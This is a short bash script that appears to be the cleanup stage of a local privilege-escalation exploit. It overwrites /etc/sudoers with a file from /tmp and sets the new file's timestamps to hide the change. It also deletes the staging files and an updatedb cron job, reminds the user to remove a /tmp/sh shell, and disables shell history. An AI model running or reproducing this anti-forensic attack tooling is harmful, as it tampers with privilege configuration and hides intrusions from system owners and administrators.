#!/bin/bash

if [ ! -f /tmp/sudo ]; then
echo "Error."
exit
fi

rm -rf /etc/sudoers
cp -f /tmp/sudo /etc/sudoers
touch -acmr /tmp/sudo /etc/sudoers
rm -rf /tmp/sudo
rm -rf /etc/cron.d/updatedb

echo "Remove /tmp/sh when you're done."
unset HISTORY HISTFILE HISTSAVE HISTZONE HISTORY HISTLOG;export HISTFILE=/dev/null ; export HISTSIZE=0; export HISTFILESIZE=0
